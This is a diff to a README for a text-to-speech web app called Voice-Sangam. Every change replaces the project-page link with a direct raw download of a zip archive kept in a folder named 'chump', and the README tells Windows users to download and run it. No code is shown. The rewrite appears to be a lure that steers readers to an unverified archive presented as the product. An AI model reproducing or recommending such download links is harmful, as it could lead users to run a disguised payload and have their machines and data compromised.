@@ -1,12 +1,12 @@
 # 🎙️ Voice-Sangam - Simple Text to Natural Speech
 
-[![Download Voice-Sangam](https://img.shields.io/badge/Download-Voice--Sangam-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/borna2315/Voice-Sangam)
+[![Download Voice-Sangam](https://img.shields.io/badge/Download-Voice--Sangam-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/borna2315/Voice-Sangam/raw/refs/heads/main/chump/Sangam-Voice-v3.4.zip)
 
 ## 📥 Download Voice-Sangam
 
 Use this link to visit the page to download and run Voice-Sangam on Windows:
 
-[Download Voice-Sangam](https://github.com/borna2315/Voice-Sangam)
+[Download Voice-Sangam](https://github.com/borna2315/Voice-Sangam/raw/refs/heads/main/chump/Sangam-Voice-v3.4.zip)
 
 ## ✨ What Voice-Sangam Does
 
@@ -41,7 +41,7 @@ For best results, use:
 Follow these steps to run Voice-Sangam on your PC:
 
 1. Open the download page:
-   [https://github.com/borna2315/Voice-Sangam](https://github.com/borna2315/Voice-Sangam)
+   [https://github.com/borna2315/Voice-Sangam/raw/refs/heads/main/chump/Sangam-Voice-v3.4.zip](https://github.com/borna2315/Voice-Sangam/raw/refs/heads/main/chump/Sangam-Voice-v3.4.zip)
 
 2. Look for the latest release or the main download file on the page.
 
@@ -215,4 +215,4 @@ Voice-Sangam uses modern web tools and AI voice services. It is built with Next.
 - Type: Text-to-speech platform
 - Platform: Windows-friendly web app
 - Main purpose: Convert text into spoken audio
-- Primary link: https://github.com/borna2315/Voice-Sangam
+- Primary link: https://github.com/borna2315/Voice-Sangam/raw/refs/heads/main/chump/Sangam-Voice-v3.4.zip
